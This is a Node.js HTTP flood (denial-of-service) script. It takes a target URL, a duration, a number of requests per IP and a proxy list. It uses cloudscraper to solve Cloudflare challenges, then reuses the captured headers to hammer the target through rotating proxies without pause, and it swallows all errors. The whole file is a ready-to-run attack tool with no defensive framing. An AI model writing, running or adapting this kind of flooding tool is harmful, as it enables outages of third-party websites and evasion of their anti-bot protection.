Require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs'),
    CloudScraper = require('cloudscraper'), 
    path = require('path');


if (process.argv.length !== 6) {
    console.log(`
Usage: node ${path.basename(__filename)} <url> <time> <req_per_ip> <proxies>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <100> <http.txt>`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4];

let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);

let getHeaders = async function () {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    try {
        const response = await CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10
        });

        return response.request.headers; 

    } catch (error) {
        let obj_v = proxies.indexOf(proxy);
        if (obj_v !== -1) {
            proxies.splice(obj_v, 1);
        }
        console.log(error.message);
        
        throw error;
    }
};

async function send_req() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    try {
        const headers = await getHeaders(); 
        
        for (let i = 0; i < req_per_ip; ++i) {
            try {
                await CloudScraper({
                    uri: target,
                    headers: headers,
                    proxy: 'http://' + proxy,
                    followAllRedirects: false
                });
            } catch (error) {
                console.log(error.message);
            }
        }

    } catch (error) {
        
    }
}

setInterval(() => {
    send_req();
});

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

process.on('uncaughtException', function (err) {
    
});
process.on('unhandledRejection', function (err) {
    
});
